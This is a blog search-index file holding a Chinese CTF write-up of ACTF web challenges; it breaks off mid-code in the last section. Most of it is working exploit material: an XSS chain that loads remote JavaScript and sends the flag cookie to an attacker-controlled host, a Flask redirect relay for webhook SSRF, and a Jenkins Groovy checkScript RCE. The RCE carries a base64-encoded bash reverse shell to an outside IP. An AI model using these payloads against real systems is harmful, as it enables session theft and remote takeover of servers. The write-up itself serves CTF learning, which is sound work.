{"meta":{"title":"光辉的blog啦~~","subtitle":"","description":"","author":"1llustrious","url":"https://1llustrious.github.io","root":"/"},"pages":[{"title":"links","date":"2023-12-01T00:12:08.000Z","updated":"2023-12-01T00:36:51.320Z","comments":true,"path":"links/index.html","permalink":"https://1llustrious.github.io/links/index.html","excerpt":"","text":""},{"title":"about","date":"2023-12-01T07:41:57.000Z","updated":"2023-12-01T07:50:52.597Z","comments":true,"path":"about/index.html","permalink":"https://1llustrious.github.io/about/index.html","excerpt":"","text":"博客简介 没什么好介绍的，菜狗萌新一个😭, 北京某高校不知名的 web🐕一条，师傅们手下留情，目前隶属于 0psu3 战队，但也只是负责端茶倒水的类型. 我的 id 是 1llustrious, 来源于光辉号航空母舰，没错，本人喜爱光辉. 前身是卑微的旮旯玩家，所以你会在我的博客中看到各种旮旯要素. 我的博客主要用于记录一些学习的内容和生活，偶尔我心情不好的时候，～～性情大发 (不是)~~ 就会写点非常逆天的话，同时使用大量抽象的 emoji, 也不知道跟谁学的. 还请师傅们手下留情，本人文章多少有点瑕疵，希望轻点喷😭😭😭😭"}],"posts":[{"title":"ACTF-复现","slug":"ACTF-复现","date":"2023-12-02T00:12:41.000Z","updated":"2023-12-02T01:10:19.566Z","comments":true,"path":"2023/12/02/ACTF-复现/","link":"","permalink":"https://1llustrious.github.io/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"写在前面 easy latex new URL 特性😂 运用到题目🤪 visit 触发 hooks what is webhook🤔 Abusing Jenkins login 开打😤 ~Ave Mujica’s Masquerade~ 源码，冲😓 story 源码🤔 写在前面 呜呜呜，shanhegiegie 太猛了，打了一天懒猫，第二天还要上课，周六补课，是谁啊，原来是👴啊，那没事了 (nmsl). 参考: https://wm-ctf-team.feishu.cn/docx/PLbbdhwdyoAefuxokXwcYppzn1c 微信公众平台 (qq.com) easy latex new URL 特性😂 先来个小 demo 1234const username = &quot;43.143.192.19:1145&quot;const vip_url = &quot;http://vip:5000/&quot;console.log(new URL(username,vip_url)) 如此，pathname 是我们的第一个参数，host 是我们的第二个参数. 倘若我第一个参数前面加 \\\\ 或是 //, 阁下又当如何应对😓. 12345const username = &quot;\\\\\\\\43.143.192.19:1145&quot;//const username = &quot;//43.143.192.19:1145&quot;const vip_url = &quot;http://vip:5000/&quot;console.log(new URL(username,vip_url)) 喜欢我绕过污染 host 吗😛 运用到题目🤪 不多 bb, 源码鉴赏一波 123456789101112app.get(&#x27;/preview&#x27;, (req, res) =&gt; &#123; let &#123; tex, theme &#125; = req.query if (!tex) &#123; tex = &#x27;Today is \\\\today.&#x27; &#125; const nonce = getNonce(16) let base = &#x27;https://cdn.jsdelivr.net/npm/latex.js/dist/&#x27; if (theme) &#123; base = new URL(theme, `http://$&#123;req.headers.host&#125;/theme/`) + &#x27;/&#x27; &#125; res.render(&#x27;preview.html&#x27;, &#123; tex, nonce, base &#125;)&#125;) 我直接 theme 上放入我的 vps, 远程加载奥西给 1preview?tex=asd&amp;theme=//43.143.192.19:1145 经一格德拉米的测试😤,wcsndm, 就算啥路径都不加他都会访问 /js/base.js, 这很不自由🤔. 没关系，直接在 vps 起一个一模一样的 emoji,👴真是个天才. 1alert(&#x27;wcsndm&#x27;); /var/www/html/base/base.js 放上这个代码，测试一波，让我狠狠地测！！！🥵 欧内的手，好汉，奥西给，爽的雅痞，比🐍出来还爽. visit 触发 不多 bb, 上源码 123456789101112131415app.get(&#x27;/share/:id&#x27;, reportLimiter, async (req, res) =&gt; &#123; const &#123; id &#125; = req.params if (!id) &#123; res.send(&#x27;no note id specified&#x27;) return &#125; const url = `http://localhost:$&#123;PORT&#125;/note/$&#123;id&#125;` try &#123; await visit(url) res.send(&#x27;done&#x27;) &#125; catch (e) &#123; console.log(e) res.send(&#x27;something error&#x27;) &#125;&#125;) 123456789101112131415161718192021222324252627const visit = async (url) =&gt; &#123; console.log(`start: $&#123;url&#125;`) const browser = await puppeteer.launch(&#123; headless: &#x27;new&#x27;, executablePath: &#x27;/usr/bin/google-chrome-stable&#x27;, args: [&#x27;--no-sandbox&#x27;], &#125;) const ctx = await browser.createIncognitoBrowserContext(); try&#123; const page = await ctx.newPage(); await page.setCookie(&#123; name: &#x27;flag&#x27;, value: FLAG, domain: `$&#123;APP_HOST&#125;:$&#123;APP_PORT&#125;`, httpOnly: true &#125;) await page.goto(url, &#123;timeout: 5000&#125;) await sleep(3000) await page.close() &#125;catch(e)&#123; console.log(e); &#125; await ctx.close(); await browser.close() console.log(`done: $&#123;url&#125;`)&#125; 那么众所周知，visit 就是能够自行打开浏览器并且访问，不知道的话上网查，别问👴. 123456789101112131415161718app.post(&#x27;/vip&#x27;, auth, async (req, res) =&gt; &#123; let username = req.session.username let &#123; code &#125; = req.body let vip_url = VIP_URL let data = await (await fetch(new URL(username, vip_url), &#123; method: &#x27;POST&#x27;, headers: &#123; Cookie: Object.entries(req.cookies).map(([k, v]) =&gt; `$&#123;k&#125;=$&#123;v&#125;`).join(&#x27;; &#x27;) &#125;, body: new URLSearchParams(&#123; code &#125;) &#125;)).text() if (&#x27;ok&#x27; == data) &#123; res.cookie(&#x27;token&#x27;, sign(&#123; username, isVip: true &#125;)) res.send(&#x27;Congratulation! You are VIP now.&#x27;) &#125; else &#123; res.send(data) &#125;&#125;) 而这个 visit, 打开浏览器访问，🍪里面是携带着 flag, 所以👴要拿到这个🍪. 但是 flag 不一定能够传来，而 vip 路由能够强制让 Cookie 携带就很好✌ 不过直接访问是拿不到的，怎么办捏，xss 过来！ 1/share路由new url访问-&gt;/preview路由进行new url xss-&gt;加载vps恶意js-&gt;以带🍪的身份访问/login和/vip,触发vip的fetch访问-&gt;将🍪数据转到xss平台. 使用 urlencode 12/share/%2e%2e%2f%70%72%65%76%69%65%77%3f%74%65%78%3d%61%77%64%61%64%61%77%64%26%74%68%65%6d%65%3d%2f%2f%34%33%2e%31%34%33%2e%31%39%32%2e%31%39%3a%31%31%34%35/share/../preview?tex=awdadawd&amp;theme=//43.143.192.19:1145 目录穿越大法访问 preview, 至于为啥用 url 编码，因为是接在路径之后的，容易被解析成路径而不是传递的参数. js 上放丶东西 12345678910111213141516171819202122232425262728293031323334353637const login = &#x27;/login&#x27;;const vip = &#x27;/vip&#x27;;const loginreq = new URLSearchParams(&#123; username: &#x27;//z08vedyv.requestrepo.com&#x27;, password: &#x27;7bbf4ac9596b5662b44db993bd8050dd&#x27;,&#125;);const changshu = &#123; method: &#x27;POST&#x27;, headers: &#123; &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;, &#125;, body: loginreq,&#125;;async function evil() &#123; try &#123; const loginrep = await fetch(login, changshu); if (loginrep.ok) &#123; const vipResponse = await fetch(vip, &#123; method: &#x27;POST&#x27;, headers: &#123; &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;, &#125;, body: new URLSearchParams(&#123; code: &quot;awdawdwadwadwadwa&quot; &#125;), credentials: &#x27;include&#x27;, &#125;); // 在这里你可以处理vipResponse &#125; else &#123; // 在这里处理登录失败的情况 &#125; &#125; catch (error) &#123; console.error(error); &#125;&#125;evil(); 👴爱使用 Dashboard - requestrepo.com 收 cookies cnm 不好用，还是 vps 得劲 eeeeeeeeeeeeeeez, もろいもろい。 最後の exp 改 12345678910111213141516171819202122232425262728293031323334353637const login = &#x27;/login&#x27;;const vip = &#x27;/vip&#x27;;const loginreq = new URLSearchParams(&#123; username: &#x27;//43.143.192.19:7777&#x27;, password: &#x27;9aaf577e773320b3548fdc5f37aa6e74&#x27;&#125;);const changshu = &#123; method: &#x27;POST&#x27;, headers: &#123; &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;, &#125;, body: loginreq,&#125;;async function evil() &#123; try &#123; const loginrep = await fetch(login, changshu); if (loginrep.ok) &#123; const vipResponse = await fetch(vip, &#123; method: &#x27;POST&#x27;, headers: &#123; &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;, &#125;, body: new URLSearchParams(&#123; code: &quot;awdawdwadwadwadwa&quot; &#125;), credentials: &#x27;include&#x27;, &#125;); // 在这里你可以处理vipResponse &#125; else &#123; // 在这里处理登录失败的情况 &#125; &#125; catch (error) &#123; console.error(error); &#125;&#125;evil(); 现在，👴就是新世界の卡密. hooks https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/ what is webhook🤔 Webhook 是一种通过 HTTP 协议实现的回调机制，用于将实时事件和数据从一个应用程序传递到另一个应用程序。Webhook 允许应用程序在特定事件发生时自动通知其他应用程序，这种通知是通过 HTTP POST 请求进行的。它是一种用于实现实时通信和数据传递的轻量级机制。 以下是 Webhook 的主要特点和用途： 事件驱动通知： Webhook 主要用于事件驱动的通知，例如新的订单、新的消息、状态更改等。当特定事件发生时，源应用程序将发送 HTTP POST 请求到目标应用程序的 Webhook URL，通知目标应用程序进行响应。 实时性： Webhook 通常具有低延迟，因为它们是即时触发的。当事件发生时，通知立即发送，而不需要轮询或定期检查。 自动化： Webhook 允许自动化处理事件和数据，减少了手动干预的需要。这对于集成不同应用程序、自动化工作流程和提高效率非常有用。 扩展性： Webhook 可以与各种不同类型的应用程序和服务集成，使其具有很高的灵活性和扩展性。 数据传递： Webhook 可以传递各种数据格式，包括 JSON、XML、表单数据等，这使得它们适用于多种应用场景。 重点🤪:webhook 只允许我们发送 POST 请求，没法控制请求的 body, 甚至没有 csrf 的 token😓 Abusing Jenkins login 不说人话: Jenkins 是一个开源的自动化服务器，用于构建、测试和部署软件项目。它提供了一个灵活的平台，使团队能够自动化整个软件开发过程中的各种任务。以下是 Jenkins 的主要特点和用途： 持续集成 (CI) 和持续交付 (CD)： Jenkins 通过自动化构建和测试过程，支持持续集成和持续交付，使团队能够频繁地、可靠地交付软件。 插件生态系统： Jenkins 具有强大的插件生态系统，允许用户轻松地扩展其功能。有数千个可用的插件，用于与各种工具和技术进行集成。 分布式构建： Jenkins 支持分布式构建，可以将构建任务分发到多个构建代理 (Nodes)，以提高构建性能和可扩展性。 自动化部署： Jenkins 可以与各种部署工具和云平台集成，支持自动化部署到不同环境，包括开发、测试和生产环境。 可视化界面： Jenkins 提供直观的 Web 用户界面，用于管理构建任务、查看构建历史和生成报告。 多种构建工具支持： Jenkins 可以与各种构建工具集成，包括 Apache Ant、Maven、Gradle 等。 多语言支持： Jenkins 支持多种编程语言和技术栈，使其适用于各种项目。 安全性和权限控制： Jenkins 具有强大的安全性和权限控制功能，可以管理用户和角色的访问权限。 日志记录和报告： Jenkins 生成详细的构建日志和报告，以便诊断问题和追踪构建进度。 活跃的社区和支持： Jenkins 是一个开源项目，有一个活跃的社区，提供支持、文档和插件。 说人话:👴也不知道 一种绕过它们的方法，从登录页面开始。我们可以尝试暴力破解用户凭据，因为 Jenkins 用户在其自己的用户数据库中进行管理，或者使用其他缺乏基本保护（例如密码策略或针对自动化的保护）的用户管理方法，这是很常见的。(机翻，👴看不懂🐏文) 总而言之就是，通过 github 或 gitlab 的 webhooks 经过 python 中转，打到题目的内网. 👴真 tm 是个 sb, 看个文章没看全，把一部分 exp 拿去打，死活打不通，后来问⛰🌊giegie, 才知道要通过 python 写个重定向中转才能有回显，说是有视频演示，👴tm🐇了，没这么 sb 吧，阿米诺斯. 开打😤 1234567from flask import Flask,redirectapp = Flask(__name__)@app.route(&#x27;/evil&#x27;, methods=[&#x27;POST&#x27;])def evil(): return redirect(&quot;http://124.70.33.170:8088/redirect?redirect_url=http://jenkins:8080/&quot;,code=302)if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, port=7777) 123456&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head resURL=&quot;/static/e1c81722&quot; data-rooturl=&quot;&quot; data-resurl=&quot;/static/e1c81722&quot;&gt; &lt;title&gt;Dashboard [Jenkins]&lt;/title&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;/static/e1c81722/css/layout-common.css&quot; type=&quot;text/css&quot; /&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;/static/e1c81722/css/style.css&quot; type=&quot;text/css&quot; /&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;/static/e1c81722/css/color.css&quot; type=&quot;text/css&quot; /&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;/static/e1c81722/css/responsive-grid.css&quot; type=&quot;text/css&quot; /&gt;&lt;link rel=&quot;shortcut icon&quot; href=&quot;/static/e1c81722/favicon.ico&quot; type=&quot;image/vnd.microsoft.icon&quot; /&gt;&lt;link color=&quot;black&quot; rel=&quot;mask-icon&quot; href=&quot;/images/mask-icon.svg&quot; /&gt;&lt;script&gt;var isRunAsTest=false; var rootURL=&quot;&quot;; var resURL=&quot;/static/e1c81722&quot;;&lt;/script&gt;&lt;script src=&quot;/static/e1c81722/scripts/prototype.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/e1c81722/scripts/behavior.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;&lt;script src=&#x27;/adjuncts/e1c81722/org/kohsuke/stapler/bind.js&#x27; type=&#x27;text/javascript&#x27;&gt;&lt;/script&gt;&lt;script src=&quot;/static/e1c81722/scripts/yui/yahoo/yahoo-min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/e1c81722/scripts/yui/dom/dom-min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/e1c81722/scripts/yui/event/event-min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/e1c81722/scripts/yui/animation/animation-min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/e1c81722/scripts/yui/dragdrop/dragdrop-min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/e1c81722/scripts/yui/container/container-min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/e1c81722/scripts/yui/connection/connection-min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/e1c81722/scripts/yui/datasource/datasource-min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/e1c81722/scripts/yui/autocomplete/autocomplete-min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/e1c81722/scripts/yui/menu/menu-min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/e1c81722/scripts/yui/element/element-min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/e1c81722/scripts/yui/button/button-min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/e1c81722/scripts/yui/storage/storage-min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/e1c81722/scripts/hudson-behavior.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/e1c81722/scripts/sortable.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;&lt;script&gt;crumb.init(&quot;&quot;, &quot;&quot;);&lt;/script&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;/static/e1c81722/scripts/yui/container/assets/container.css&quot; type=&quot;text/css&quot; /&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;/static/e1c81722/scripts/yui/assets/skins/sam/skin.css&quot; type=&quot;text/css&quot; /&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;/static/e1c81722/scripts/yui/container/assets/skins/sam/container.css&quot; type=&quot;text/css&quot; /&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;/static/e1c81722/scripts/yui/button/assets/skins/sam/button.css&quot; type=&quot;text/css&quot; /&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;/static/e1c81722/scripts/yui/menu/assets/skins/sam/menu.css&quot; type=&quot;text/css&quot; /&gt;&lt;link rel=&quot;search&quot; href=&quot;/opensearch.xml&quot; type=&quot;application/opensearchdescription+xml&quot; title=&quot;Jenkins&quot; /&gt;&lt;meta name=&quot;ROBOTS&quot; content=&quot;INDEX,NOFOLLOW&quot; /&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot; /&gt;&lt;link rel=&quot;alternate&quot; href=&quot;/rssAll&quot; title=&quot;Jenkins:all (all builds)&quot; type=&quot;application/rss+xml&quot; /&gt;&lt;link rel=&quot;alternate&quot; href=&quot;/rssAll?flavor=rss20&quot; title=&quot;Jenkins:all (all builds) (RSS 2.0)&quot; type=&quot;application/rss+xml&quot; /&gt;&lt;link rel=&quot;alternate&quot; href=&quot;/rssFailed&quot; title=&quot;Jenkins:all (failed builds)&quot; type=&quot;application/rss+xml&quot; /&gt;&lt;link rel=&quot;alternate&quot; href=&quot;/rssFailed?flavor=rss20&quot; title=&quot;Jenkins:all (failed builds) (RSS 2.0)&quot; type=&quot;application/rss+xml&quot; /&gt;&lt;script src=&quot;/static/e1c81722/scripts/yui/cookie/cookie-min.js&quot;&gt;&lt;/script&gt;&lt;script&gt; YAHOO.util.Cookie.set(&quot;screenResolution&quot;, screen.width+&quot;x&quot;+screen.height); &lt;/script&gt;&lt;script src=&quot;/static/e1c81722/jsbundles/page-init.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body data-model-type=&quot;hudson.model.AllView&quot; id=&quot;jenkins&quot; class=&quot;yui-skin-sam two-column jenkins-2.138&quot; data-version=&quot;2.138&quot;&gt;&lt;a href=&quot;#skip2content&quot; class=&quot;skiplink&quot;&gt;Skip to content&lt;/a&gt;&lt;div id=&quot;page-head&quot;&gt;&lt;div id=&quot;header&quot;&gt;&lt;div class=&quot;logo&quot;&gt;&lt;a id=&quot;jenkins-home-link&quot; href=&quot;/&quot;&gt;&lt;img src=&quot;/static/e1c81722/images/headshot.png&quot; alt=&quot;[Jenkins]&quot; id=&quot;jenkins-head-icon&quot; /&gt;&lt;img src=&quot;/static/e1c81722/images/title.png&quot; alt=&quot;Jenkins&quot; width=&quot;139&quot; id=&quot;jenkins-name-icon&quot; height=&quot;34&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;login&quot;&gt; &lt;a href=&quot;/login?from=%2F&quot;&gt;&lt;b&gt;log in&lt;/b&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;searchbox hidden-xs&quot;&gt;&lt;form method=&quot;get&quot; name=&quot;search&quot; action=&quot;/search/&quot; style=&quot;position:relative;&quot; class=&quot;no-json&quot;&gt;&lt;div id=&quot;search-box-minWidth&quot;&gt;&lt;/div&gt;&lt;div id=&quot;search-box-sizer&quot;&gt;&lt;/div&gt;&lt;div id=&quot;searchform&quot;&gt;&lt;input name=&quot;q&quot; placeholder=&quot;search&quot; id=&quot;search-box&quot; class=&quot;has-default-text&quot; /&gt; &lt;a href=&quot;https://jenkins.io/redirect/search-box&quot;&gt;&lt;img src=&quot;/static/e1c81722/images/16x16/help.png&quot; style=&quot;width: 16px; height: 16px; &quot; class=&quot;icon-help icon-sm&quot; /&gt;&lt;/a&gt;&lt;div id=&quot;search-box-completion&quot;&gt;&lt;/div&gt;&lt;script&gt;createSearchBox(&quot;/search/&quot;);&lt;/script&gt;&lt;/div&gt;&lt;/form&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id=&quot;breadcrumbBar&quot;&gt;&lt;tr id=&quot;top-nav&quot;&gt;&lt;td id=&quot;left-top-nav&quot; colspan=&quot;2&quot;&gt;&lt;link rel=&#x27;stylesheet&#x27; href=&#x27;/adjuncts/e1c81722/lib/layout/breadcrumbs.css&#x27; type=&#x27;text/css&#x27; /&gt;&lt;script src=&#x27;/adjuncts/e1c81722/lib/layout/breadcrumbs.js&#x27; type=&#x27;text/javascript&#x27;&gt;&lt;/script&gt;&lt;div class=&quot;top-sticker noedge&quot;&gt;&lt;div class=&quot;top-sticker-inner&quot;&gt;&lt;div id=&quot;right-top-nav&quot;&gt;&lt;div id=&quot;right-top-nav&quot;&gt;&lt;div class=&quot;smallfont&quot;&gt;&lt;a href=&quot;?auto_refresh=true&quot;&gt;ENABLE AUTO REFRESH&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;ul id=&quot;breadcrumbs&quot;&gt;&lt;li class=&quot;item&quot;&gt;&lt;a href=&quot;/&quot; class=&quot;model-link inside&quot;&gt;Jenkins&lt;/a&gt;&lt;/li&gt;&lt;li href=&quot;/&quot; class=&quot;children&quot;&gt;&lt;/li&gt;&lt;/ul&gt;&lt;div id=&quot;breadcrumb-menu-target&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id=&quot;page-body&quot; class=&quot;clear&quot;&gt;&lt;div id=&quot;side-panel&quot;&gt;&lt;div id=&quot;tasks&quot;&gt;&lt;div class=&quot;task&quot;&gt;&lt;a href=&quot;/asynchPeople/&quot; class=&quot;task-icon-link&quot;&gt;&lt;img src=&quot;/static/e1c81722/images/24x24/user.png&quot; style=&quot;width: 24px; height: 24px; width: 24px; height: 24px; margin: 2px;&quot; class=&quot;icon-user icon-md&quot; /&gt;&lt;/a&gt; &lt;a href=&quot;/asynchPeople/&quot; class=&quot;task-link&quot;&gt;People&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;task&quot;&gt;&lt;a href=&quot;/view/all/builds&quot; class=&quot;task-icon-link&quot;&gt;&lt;img src=&quot;/static/e1c81722/images/24x24/notepad.png&quot; style=&quot;width: 24px; height: 24px; width: 24px; height: 24px; margin: 2px;&quot; class=&quot;icon-notepad icon-md&quot; /&gt;&lt;/a&gt; &lt;a href=&quot;/view/all/builds&quot; class=&quot;task-link&quot;&gt;Build History&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;task&quot;&gt;&lt;a href=&quot;/credentials&quot; class=&quot;task-icon-link&quot;&gt;&lt;img src=&quot;/static/e1c81722/plugin/credentials/images/24x24/credentials.png&quot; style=&quot;width: 24px; height: 24px; width: 24px; height: 24px; margin: 2px;&quot; class=&quot;icon-credentials-credentials icon-md&quot; /&gt;&lt;/a&gt; &lt;a href=&quot;/credentials&quot; class=&quot;task-link&quot;&gt;Credentials&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id=&quot;buildQueue&quot; class=&quot;container-fluid pane-frame track-mouse expanded&quot;&gt;&lt;div class=&quot;row&quot;&gt;&lt;div class=&quot;col-xs-24 pane-header&quot;&gt;&lt;a href=&quot;/toggleCollapse?paneId=buildQueue&quot; title=&quot;collapse&quot; class=&quot;collapse&quot;&gt;&lt;img src=&quot;/static/e1c81722/images/16x16/collapse.png&quot; alt=&quot;collapse&quot; style=&quot;width: 16px; height: 16px; &quot; class=&quot;icon-collapse icon-sm&quot; /&gt;&lt;/a&gt;Build Queue&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;row pane-content&quot;&gt;&lt;table class=&quot;pane &quot;&gt;&lt;script src=&#x27;/adjuncts/e1c81722/lib/form/link/link.js&#x27; type=&#x27;text/javascript&#x27;&gt;&lt;/script&gt;&lt;tr&gt;&lt;td class=&quot;pane&quot; colspan=&quot;2&quot;&gt;No builds in the queue.&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;script defer=&quot;defer&quot;&gt;refreshPart(&#x27;buildQueue&#x27;,&quot;/ajaxBuildQueue&quot;);&lt;/script&gt;&lt;div id=&quot;executors&quot; class=&quot;container-fluid pane-frame track-mouse expanded&quot;&gt;&lt;div class=&quot;row&quot;&gt;&lt;div class=&quot;col-xs-24 pane-header&quot;&gt;&lt;a href=&quot;/toggleCollapse?paneId=executors&quot; title=&quot;collapse&quot; class=&quot;collapse&quot;&gt;&lt;img src=&quot;/static/e1c81722/images/16x16/collapse.png&quot; alt=&quot;collapse&quot; style=&quot;width: 16px; height: 16px; &quot; class=&quot;icon-collapse icon-sm&quot; /&gt;&lt;/a&gt;&lt;a href=&#x27;/computer/&#x27;&gt;Build Executor Status&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;row pane-content&quot;&gt;&lt;table class=&quot;pane &quot;&gt;&lt;colgroup&gt;&lt;col width=&quot;30&quot; /&gt;&lt;col width=&quot;200*&quot; /&gt;&lt;col width=&quot;24&quot; /&gt;&lt;/colgroup&gt;&lt;tr&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;pane&quot; align=&quot;right&quot; style=&quot;vertical-align: top&quot;&gt;1&lt;/td&gt;&lt;td class=&quot;pane&quot;&gt;Idle&lt;/td&gt;&lt;td class=&quot;pane&quot;&gt;&lt;/td&gt;&lt;td class=&quot;pane&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;pane&quot; align=&quot;right&quot; style=&quot;vertical-align: top&quot;&gt;2&lt;/td&gt;&lt;td class=&quot;pane&quot;&gt;Idle&lt;/td&gt;&lt;td class=&quot;pane&quot;&gt;&lt;/td&gt;&lt;td class=&quot;pane&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;script defer=&quot;defer&quot;&gt;refreshPart(&#x27;executors&#x27;,&quot;/ajaxExecutors&quot;);&lt;/script&gt;&lt;/div&gt;&lt;div id=&quot;main-panel&quot;&gt;&lt;a name=&quot;skip 看到 jenkins 版本为 2.138, 别问👴怎么看到的，你咋那么多事呢😡 https://www.cnblogs.com/cute-puli/p/15378440.html 1http://x.x.x.x:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=public%20class%20x%20&#123;public%20x()&#123;%22命令替换%22.execute()&#125;&#125; 打这个命令 1http://jenkins:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=public class x &#123;public x()&#123;&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80My4xNDMuMTkyLjE5LzExNDUgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;.execute()&#125;&#125; 先把 value 的值 url 编码，然后把整个重定向网址 url 编码， 1http://jenkins:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=%70%75%62%6c%69%63%20%63%6c%61%73%73%20%78%20%7b%0a%20%20%70%75%62%6c%69%63%20%78%28%29%7b%0a%20%20%20%20%22%62%61%73%68%20%2d%63%20%7b%65%63%68%6f%2c%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%30%4d%79%34%78%4e%44%4d%75%4d%54%6b%79%4c%6a%45%35%4c%7a%45%78%4e%44%55%67%4d%44%34%6d%4d%51%3d%3d%7d%7c%7b%62%61%73%65%36%34%2c%2d%64%7d%7c%7b%62%61%73%68%2c%2d%69%7d%22%2e%65%78%65%63%75%74%65%28%29%0a%20%20%7d%0a%7d 1%68%74%74%70%3a%2f%2f%6a%65%6e%6b%69%6e%73%3a%38%30%38%30%2f%73%65%63%75%72%69%74%79%52%65%61%6c%6d%2f%75%73%65%72%2f%61%64%6d%69%6e%2f%64%65%73%63%72%69%70%74%6f%72%42%79%4e%61%6d%65%2f%6f%72%67%2e%6a%65%6e%6b%69%6e%73%63%69%2e%70%6c%75%67%69%6e%73%2e%73%63%72%69%70%74%73%65%63%75%72%69%74%79%2e%73%61%6e%64%62%6f%78%2e%67%72%6f%6f%76%79%2e%53%65%63%75%72%65%47%72%6f%6f%76%79%53%63%72%69%70%74%2f%63%68%65%63%6b%53%63%72%69%70%74%3f%73%61%6e%64%62%6f%78%3d%74%72%75%65%26%76%61%6c%75%65%3d最终 exp,👴の最後のエクスプロイト (exloit) 1234567from flask import Flask,redirectapp = Flask(__name__)@app.route(&#x27;/evil&#x27;, methods=[&#x27;POST&#x27;])def evil(): return redirect(&quot;http://124.70.33.170:8088/redirect?redirect_url=%68%74%74%70%3a%2f%2f%6a%65%6e%6b%69%6e%73%3a%38%30%38%30%2f%73%65%63%75%72%69%74%79%52%65%61%6c%6d%2f%75%73%65%72%2f%61%64%6d%69%6e%2f%64%65%73%63%72%69%70%74%6f%72%42%79%4e%61%6d%65%2f%6f%72%67%2e%6a%65%6e%6b%69%6e%73%63%69%2e%70%6c%75%67%69%6e%73%2e%73%63%72%69%70%74%73%65%63%75%72%69%74%79%2e%73%61%6e%64%62%6f%78%2e%67%72%6f%6f%76%79%2e%53%65%63%75%72%65%47%72%6f%6f%76%79%53%63%72%69%70%74%2f%63%68%65%63%6b%53%63%72%69%70%74%3f%73%61%6e%64%62%6f%78%3d%74%72%75%65%26%76%61%6c%75%65%3dquot;,code=302)if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, port=7777) 哈哈哈哈哈！欺骗世界这种事情，对于👴来说，简直小菜一碟. わたしは強い あなたたちより強い！ 这一切都是命运石之门的选择！ ~Ave Mujica’s Masquerade~ 「お幸せに」, 希啊哇赛你妹的，👴很😡😡. 源码，冲😓 12345678910111213141516171819202122232425262728293031323334353637app.get(&#x27;/checker&#x27;, (req, res) =&gt; &#123; let url = req.query.url; if (url) &#123; let host; let port; // MakE it Safer!!!!! if (url.includes(&quot;:&quot;)) &#123; const parts = url.split(&quot;:&quot;); host = parts[0]; port = parts.slice(1).join(&quot;:&quot;); &#125; else &#123; host = url; &#125; if (port) &#123; command = shellQuote.quote([&quot;nmap&quot;, &quot;-p&quot;, port, host]); // Construct the shell command &#125; else &#123; command = shellQuote.quote([&quot;nmap&quot;, &quot;-p&quot;, &quot;80&quot;, host]); &#125; nmap = 